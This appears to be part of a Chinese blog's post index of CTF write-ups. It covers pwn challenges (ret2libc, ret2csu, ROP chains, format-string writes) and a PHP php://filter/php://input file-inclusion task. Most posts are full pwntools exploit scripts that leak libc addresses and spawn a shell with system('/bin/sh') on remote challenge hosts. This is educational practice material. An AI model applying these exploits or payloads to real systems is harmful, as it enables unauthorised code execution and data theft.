class="number">0xB4</span>)</span><br><span class="line">addr(offset+<span class="number">0x1</span>,<span class="number">0x85</span>)</span><br><span class="line">addr(offset+<span class="number">0x2</span>,<span class="number">0x04</span>)</span><br><span class="line">addr(offset+<span class="number">0x3</span>,<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">addr(offset+<span class="number">0x4</span>,<span class="number">0x87</span>)</span><br><span class="line">addr(offset+<span class="number">0x5</span>,<span class="number">0x89</span>)</span><br><span class="line">addr(offset+<span class="number">0x6</span>,<span class="number">0x04</span>)</span><br><span class="line">addr(offset+<span class="number">0x7</span>,<span class="number">0x08</span>)</span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line">p.sendline(<span class="string">"5"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="8-pwn100"><a href="#8-pwn100" class="headerlink" title="8.pwn100"></a>8.pwn100</h2><p> 本题设计了中级rop中的ret init</p>
<p>1.我们首先使用puts获得libc基地址</p>
<p>但是别忘了将收到的地址去掉不该有的东西，例如“\n”，我这个铁憨憨就因为这个狗东西废了一个小孩是</p>
<p>2.得到libc版本以及system与str_bin_sh</p>
<p>3.构造rdi ret getshell</p>
<p>注意：</p>
<p>1.本题有很多解决方法，但是我感觉只需要rdi ret 这个gadget就可以</p>
<p>应该是最简单的方法</p>
<p>2.注意ret2__libc_csu_init的使用方法，被调函数要是用其got地址</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'44187'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = remote(ip,port)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400763</span></span><br><span class="line">offset = <span class="number">0x40</span></span><br><span class="line">fakeebp = <span class="number">1</span></span><br><span class="line">csu_end_addr = <span class="number">0x000000000040075A</span></span><br><span class="line">csu_front_addr = <span class="number">0x0000000000400740</span></span><br><span class="line">main_add = <span class="number">0x4006B8</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> puts_plt</span><br><span class="line">start_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13 , r14, r15, last)</span>:</span> <span class="comment">#这里的r13 r14 r15 分别为第三 第二 第一个参数</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x40</span> + p64(fakeebp)</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)  <span class="comment">#此时的r12应为被调用函数的got表地址</span></span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">'a'</span> * <span class="number">0x38</span><span class="comment">#0x38的原因看笔记</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    <span class="comment">#sh.send(payload)</span></span><br><span class="line">    <span class="comment">#sleep(1)</span></span><br><span class="line">    <span class="keyword">return</span> payload.ljust(<span class="number">200</span>,<span class="string">"a"</span>)</span><br><span class="line"><span class="comment">#payload1 =  csu(0,1,puts_got,0,0,start_got,main_add)</span></span><br><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">0x48</span> + p64(pop_rdi) + p64(start_got) + p64(puts_plt) + p64(main_add)</span><br><span class="line"><span class="comment">#print payload1</span></span><br><span class="line">p.send(payload1.ljust(<span class="number">200</span>,<span class="string">"a"</span>))</span><br><span class="line">p.recvuntil(<span class="string">"bye~\n"</span>)</span><br><span class="line">start_add = u64(p.recv().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> hex(start_add)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">"__libc_start_main"</span>,start_add)</span><br><span class="line">libc_base = start_add - libc.dump(<span class="string">"__libc_start_main"</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">bin_add = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">sys_add = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"a"</span> * <span class="number">0x48</span> + p64(pop_rdi) + p64(bin_add) + p64(sys_add) + p64(main_add)</span><br><span class="line">p.send(payload2.ljust(<span class="number">200</span>,<span class="string">"a"</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="9-pwn200"><a href="#9-pwn200" class="headerlink" title="9.pwn200"></a>9.pwn200</h2><p>很简单的rop</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'55665'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">main = <span class="number">0x80484BE</span></span><br><span class="line">payload1 = <span class="string">"a"</span> * (<span class="number">0x6c</span>+<span class="number">0x4</span>) + p32(write_plt)+  p32(main)  +p32(<span class="number">1</span>) + p32(main_got) + p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload1)</span><br><span class="line">main_libc = u32(p.recv().strip(<span class="string">'\n'</span>).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> main_libc</span><br><span class="line">libc = LibcSearcher(<span class="string">'__libc_start_main'</span>,main_libc)</span><br><span class="line">libc_base = main_libc - libc.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line">sys_add = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_add = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload2 =  <span class="string">"a"</span> * (<span class="number">0x6c</span>+<span class="number">0x4</span>) + p32(sys_add) + p32(<span class="number">1</span>) + p32(bin_add) </span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="10-welpwn"><a href="#10-welpwn" class="headerlink" title="10.welpwn"></a>10.welpwn</h2><p>参考：<a href="https://blog.csdn.net/seaaseesa/article/details/102944448" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/102944448</a></p>
<p>这里主要考察堆栈结构</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'111.198.29.45'</span></span><br><span class="line">port = <span class="string">'58639'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = remote(ip,port)</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">start_add = <span class="number">0x4007cd</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004008a3</span></span><br><span class="line">pop_4p = <span class="number">0x000000000040089c</span></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x18</span> + p64(pop_4p) + p64(pop_rdi) + p64(main_got) + p64(puts_plt) + p64(start_add)</span><br><span class="line"><span class="comment">#这里的话要搞清楚为什么需要pop_4p，因为我们需要绕过24个‘a’与pop_4p的地址，去ret我们pop_rdi，以便于继续执行</span></span><br><span class="line"><span class="comment">#p.recvuntil('Welcome to RCTF\n')</span></span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">'\x08@'</span>)</span><br><span class="line">main_add = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="comment">#这里接受7个字节是因为第八个字节为\x0a其转移字符为换行符，并且其字符是个莫名其妙的东西，做题时会卡在Libcsearch那不动，以后注意</span></span><br><span class="line"><span class="keyword">print</span> hex(main_add)</span><br><span class="line">libc = LibcSearcher(<span class="string">'__libc_start_main'</span>,main_add)</span><br><span class="line">libc_base = main_add - libc.dump(<span class="string">'__libc_start_main'</span>)</span><br><span class="line"><span class="comment">#print libc_base</span></span><br><span class="line">sys_add = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_add = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">payload0 =   <span class="string">"a"</span> * <span class="number">0x18</span> + p64(pop_4p) + p64(pop_rdi) + p64(bin_add) + p64(sys_add) + p64(start_add)</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">p.sendline(payload0)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>php伪协议</title>
    <url>/2020/01/12/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><a id="more"></a>

<p>看一道题</p>
<p>上图</p>
<p><img src="https://i.loli.net/2020/01/12/xvLJ782TrQch6MC.png" alt="QQ截图20200112210840.png"></p>
<p>可知涉及到php伪协议的问题</p>
<p>1.在file_get_contents 这里</p>
<p>我们可以使用php://这个协议php://input可以得到原始的post数据</p>
<p>2.在include（）这里我们可以看到后面有个提示hint.php</p>
<p>但是我们把file=hint.php时仍然没有任何代码</p>
<p>我们可以使用：</p>
<p>php://filter/convert.base64-encode/resource=取源代码并进行base64编码输出</p>
<p>若不使用base64编码，我们读取的内容会直接当做php代码执行就看不到源代码内容了。</p>
<p>上payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?Yeedo&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;hint.php</span><br><span class="line"></span><br><span class="line">post:Yeedo is a big hacker</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/01/12/4SXqOdg3UrDKB7y.png" alt="QQ截图20200112212501.png"></p>
<p>解码base64</p>
<p>得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">//decode(423e1e68bdc71183573da0cd33a1609)='ypcwelcome';</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在之前的payload基础上添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password&#x3D;ypcwelcome</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;1a19cbc0200dc984ae400d331a7d1a3d&#125;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>第四季答题赛 pwn</title>
    <url>/2019/12/29/%E7%AC%AC%E5%9B%9B%E5%AD%A3%E7%AD%94%E9%A2%98%E8%B5%9B%20pwn/</url>
    <content><![CDATA[<h1 id="i春秋·第四季答题赛-pwn"><a href="#i春秋·第四季答题赛-pwn" class="headerlink" title="i春秋·第四季答题赛 pwn"></a>i春秋·第四季答题赛 pwn</h1><a id="more"></a>

<h2 id="1-Self-service-Refueling-System"><a href="#1-Self-service-Refueling-System" class="headerlink" title="1.Self-service Refueling System"></a>1.Self-service Refueling System</h2><p>这个题要注意我们覆盖的地址为main函数的返回地址，所以要知道我们接受的</p>
<p>__libc_start_main 地址之前要接受的字符串</p>
<p>在做这个题的时候问题就出现在的</p>
<p>1.接受地址的时候没有去掉\n</p>
<p>2.忘记了将我们覆盖的地方是main函数的返回地址</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./2'</span></span><br><span class="line"><span class="comment">#libc_name = '/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'120.55.43.255'</span></span><br><span class="line">port = <span class="string">'23810'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400fb3</span></span><br><span class="line">main = <span class="number">0x400EAA</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * (<span class="number">0x20</span> - <span class="number">0x8</span>) + p32(<span class="number">26214</span>) + p32(<span class="number">9011</span>)+ p64(<span class="number">8</span>) + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main)</span><br><span class="line"><span class="comment">#payload = "a" * (0x20) +p64(8) + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main)</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"Do you want to refuel?(y/n)\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"y"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"Plz input your Gas Card ID :\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">"ou want?(L)\n"</span>,<span class="string">"1L"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"gas\n"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"\x30\x6d"</span>)</span><br><span class="line">add = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="comment">#print p.recvline()</span></span><br><span class="line"><span class="keyword">print</span> hex(add)</span><br><span class="line">libc = LibcSearcher(<span class="string">"__libc_start_main"</span>,int(add))</span><br><span class="line">libc_add = add - libc.dump(<span class="string">"__libc_start_main"</span>)</span><br><span class="line"><span class="keyword">print</span> libc_add</span><br><span class="line">bin_add = libc_add + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">sys_add = libc_add + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">ret = <span class="number">0x4008B1</span></span><br><span class="line">payload2 = <span class="string">"a"</span> * (<span class="number">0x20</span> - <span class="number">0x8</span>) + p32(<span class="number">26214</span>) + p32(<span class="number">9011</span>)+ p64(<span class="number">8</span>) + p64(pop_rdi) + p64(bin_add)+p64(sys_add)</span><br><span class="line"><span class="keyword">print</span> p.recvline()</span><br><span class="line"><span class="comment">#print p.recvuntil("Do you want to refuel?(y/n)")</span></span><br><span class="line">p.sendline(<span class="string">"y"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"Plz input your Gas Card ID :\n"</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendlineafter(<span class="string">"How mang gas do you want?(L)\n"</span>,<span class="string">"1L"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>攻防世界新手区pwn</title>
    <url>/2019/12/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E5%8C%BApwn/</url>
    <content><![CDATA[<h1 id="攻防世界新手区pwn"><a href="#攻防世界新手区pwn" class="headerlink" title="攻防世界新手区pwn"></a>攻防世界新手区pwn</h1><a id="more"></a>

<h2 id="1-nc"><a href="#1-nc" class="headerlink" title="1 nc"></a>1 nc</h2><p>nc 链接获取flag</p>
<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>知识：</p>
<p>关于stdin的知识见博客：<a href="https://blog.csdn.net/xmzzy2012/article/details/80584910" target="_blank" rel="noopener">https://blog.csdn.net/xmzzy2012/article/details/80584910</a></p>
<p>即：在c语言中表现为调用printf函数将内容输出到终端上。</p>
<p>这里使用的知识点为任意地址写入：</p>
<p>我们先找到偏移量</p>
<p>通过查看找到偏移量offset为：10</p>
<p>之后我们就可以使用任意地址写</p>
<p>上exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">46545</span>)</span><br><span class="line">offset = <span class="number">10</span></span><br><span class="line">pwnme_add = <span class="number">0x804a068</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"name:\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"summerN"</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"please:\n"</span>)</span><br><span class="line">payload = p32(pwnme_add) + <span class="string">"%4c%10$hhn"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br></pre></td></tr></table></figure>



<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>首先查看保护</p>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575530101770.png" alt="1575530101770"></p>
<p>发现开启了栈溢出保护但是对于这个题来说貌似没什么卵用</p>
<p>看完程序，发现直接从get（）那里溢出进入v5直接覆盖就好</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">59473</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"What's Your Birth?\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"12"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"What's Your Name?\n"</span>)</span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">8</span> + p64(<span class="number">1926</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure>



<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>先checksec一下</p>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575532324737.png" alt="1575532324737"></p>
<p>64位</p>
<p>bss数据区覆盖一下就可以</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">33733</span>)</span><br><span class="line">p.recvuntil(<span class="string">"lets get helloworld for bof\n"</span>)</span><br><span class="line">x = hex(<span class="number">1853186401</span>)</span><br><span class="line"><span class="keyword">print</span> x</span><br><span class="line">payload = <span class="string">"BBBB"</span> + p64(<span class="number">0x6e756161</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvall()</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<p>p64这类打包函数不可以使用例如x = hex(11)这类的函数</p>
<p>而可以使用直接对变量赋值的变量例如x = 11</p>
<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>先check</p>
<p><strong><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575536109047.png" alt="1575536109047"></strong></p>
<p>看IDA</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_</span><br><span class="line">        </span><br><span class="line">        level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">59602</span>)</span><br><span class="line">bin_add = <span class="number">0x400596</span></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x80</span> + <span class="number">8</span>)  + p64(bin_add)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>这里的话就是构造32位程序的ROP链</p>
<p>注意这种问题在使用elf.symbols()获取的system（）函数的地址</p>
<p>32位会出现，64位应该不会，所以32位多填充p32(),64位多填充p64()</p>
<p>也就是说只要是搜索出的call system（不是自己定义的危险函数）在system 与其后面的参数之间就要间隔对应的参数</p>
<p>很简单，但是遇到了一个问题</p>
<p>1.如果直接使用后text段的system地址的话，就很好说，不用废话</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">32152</span>)</span><br><span class="line">bin_add = <span class="number">0x0804a024</span></span><br><span class="line">sys_add = <span class="number">0x804849e</span></span><br><span class="line">payload = <span class="string">"a"</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(sys_add)  + p32(bin_add)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>2.但是如果使用.plt段的system函数的真实地址的话就不大行了</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">32152</span>)</span><br><span class="line">bin_add = <span class="number">0x0804a024</span></span><br><span class="line">sys_add = <span class="number">0x8048320</span></span><br><span class="line">payload = <span class="string">"a"</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(sys_add)+ <span class="string">"a"</span> *<span class="number">4</span>  + p32(bin_add)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>具体是因为什么我也不清楚</p>
<p>总之先记住</p>
<p>如果是从libc泄露的system的话。。。。应该是第二种了吧</p>
<p>看下我自己的认为。。</p>
<p>在使用.plt段的system时</p>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575550541723.png" alt="1575550541723"></p>
<p>看这个哈</p>
<p>我们输入的bin/sh因该位于ptr 向后4个的位置，往后看你会发先会有一个call的指令</p>
<p>我们都知道call会向栈中push一个下一条指令的地址（貌似是在str的位置，具体也不清楚）</p>
<p>因此我们要先将这个地址覆盖之后我们才可以传入bin/sh</p>
<p>就先这样理解吧。。。。</p>
<p>其实刚才那样理解就是这个意思：</p>
<h5 id="跟栈帧结构有关，每个函数的栈结构是实参‘-bin-sh’压在返回地址之前，调用system函数时，构造伪栈帧需要返回地址，然后取实参。返回地址在这里随便写就行"><a href="#跟栈帧结构有关，每个函数的栈结构是实参‘-bin-sh’压在返回地址之前，调用system函数时，构造伪栈帧需要返回地址，然后取实参。返回地址在这里随便写就行" class="headerlink" title="跟栈帧结构有关，每个函数的栈结构是实参‘/bin/sh’压在返回地址之前，调用system函数时，构造伪栈帧需要返回地址，然后取实参。返回地址在这里随便写就行"></a>跟栈帧结构有关，每个函数的栈结构是实参‘/bin/sh’压在返回地址之前，调用system函数时，构造伪栈帧需要返回地址，然后取实参。返回地址在这里随便写就行</h5><p>就先这样吧。。</p>
<h1 id="7"><a href="#7" class="headerlink" title="7"></a>7</h1><p>先增加一个知识，函数指针</p>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575594271298.png" alt="1575594271298"></p>
<p><a href="http://c.biancheng.net/view/228.html" target="_blank" rel="noopener">http://c.biancheng.net/view/228.html</a></p>
<p>关于函数指针的介绍</p>
<p>再来看这里</p>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575594310241.png" alt="1575594310241"></p>
<p>这里把v1这个void类型指针先强制类型转化为一个返回八字节的函数指针</p>
<p>通过read函数向其赋值地址</p>
<p>再来增加几个知识：</p>
<p>alarm()可以用来限制运行时间，干扰调试</p>
<p>mmap（）可以开辟出一片可读可写的内存空间</p>
<p>我们来找偏移</p>
<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1575600921737.png" alt="1575600921737"></p>
<p>从IDA上可以看到，我们可以a1的地址存放到偏移量为7的地方，所以构造以下字符串</p>
<p>构造payload = %85d%7&amp;n</p>
<p>exp：</p>
